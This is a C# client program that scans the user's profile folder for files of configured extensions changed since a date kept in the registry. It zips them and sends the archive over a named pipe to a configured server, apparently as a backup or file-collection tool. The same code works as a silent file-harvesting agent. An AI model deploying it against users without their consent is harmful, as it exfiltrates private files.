using CommandsKit;
using PipeProtocolTransport;
using System.IO;
using ScanFileSystem;
using System.Configuration;
using System.Reflection;

namespace Client
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string corePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) + '\\';
            string serverName = GetServerName(ConfigurationManager.AppSettings["server"]);
            string[] extensions = GetExtensions(ConfigurationManager.AppSettings["extensions"]);

            string dirName = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            DirectoryInfo userDir = new DirectoryInfo(dirName);

            PptClient client = new PptClient("MyPipe", serverName, 10000);

            int delayConnection = 5000;
            while (!client.Start())
            {
                Thread.Sleep(delayConnection);
                delayConnection += 5000;
            }

            DateTime lastDateTransfer = FileWork.GetDateFromRegistry();
            List<FileInfo> files = ScanFiles.GetFiles(userDir);
            files = FileWork.GetFilesForDate(files, lastDateTransfer);
            files = FileWork.GetFilesForExtensions(files, extensions);

            DateTime dateWrite = DateTime.Now;
            string zipPath = $"{corePath}{Environment.UserName}_{String.Format("{0:yyyy-MM-dd_HH-mm}", dateWrite)}.zip";

            if (files.Count() > 0)
                FileWork.CopyToZip(zipPath, files, userDir.FullName);

            FileInfo zipFile = new FileInfo(zipPath);
            if (zipFile.Exists)
            {
                FileTransport.SendFile(zipFile, client);
                zipFile.Delete();
                FileWork.AddDateToRegistry(dateWrite);
            }

            client.Close();
        }     
        
        static string[] GetExtensions(string? extensionsStr)
        {
            string[] extensions = new string[0];

            if(!String.IsNullOrEmpty(extensionsStr))
            {
                extensions = extensionsStr.Split(';');
                for (int i = 0; i < extensions.Length; i++) 
                {
                    if (extensions[i][0] != '.')
                        extensions[i] = '.' + extensions[i];
                }
            }

            return extensions;
        }
        static string GetServerName(string? serverName)
        {
            if (String.IsNullOrEmpty(serverName))
                return ".";
            else
                return serverName;
        }
    }
}